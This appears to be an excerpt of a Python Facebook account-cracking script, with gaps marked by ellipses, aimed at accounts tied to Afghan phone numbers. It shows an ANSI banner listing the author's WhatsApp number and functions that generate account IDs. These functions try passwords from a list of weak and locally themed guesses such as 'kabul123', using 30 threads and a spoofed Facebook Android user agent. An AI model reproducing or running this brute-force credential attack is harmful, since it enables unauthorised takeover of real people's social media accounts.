...
os.system('xdg-open https://www.facebook.com/profile.php?id=100027959231560')
...
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+93780076452 }\33[0;m
...
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mVERSION   \033[1;31m ┇\033[31;47m{0.5}\33[0;m                 
\033[1;31m================================================
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ua_string = 'Dalvik/1.6.0 (Linux; U; Android 11; Google Pixel 4a Build/RQ2A.210305.006) [FBAN/FB4A;{application_version};FBBV/{application_version_code};FBDM/{density=2.75,width=1080,height=2340};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Google Fi;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Google Pixel 4a;FBSV/13.0;FBOP/1;FBCA/armeabi-v7a;] '
				li = ['28','29','210']
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','123456','12345678','123456789','password','50005000']
...
def fking1(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua = 'Dalvik/1.6.0 (Linux; U; Android 11; Google Pixel 4a Build/RQ2A.210305.006) [FBAN/FB4A;{application_version};FBBV/{application_version_code};FBDM/{density=2.75,width=1080,height=2340};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Google Fi;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Google Pixel 4a;FBSV/13.0;FBOP/1;FBCA/armeabi-v7a;]'
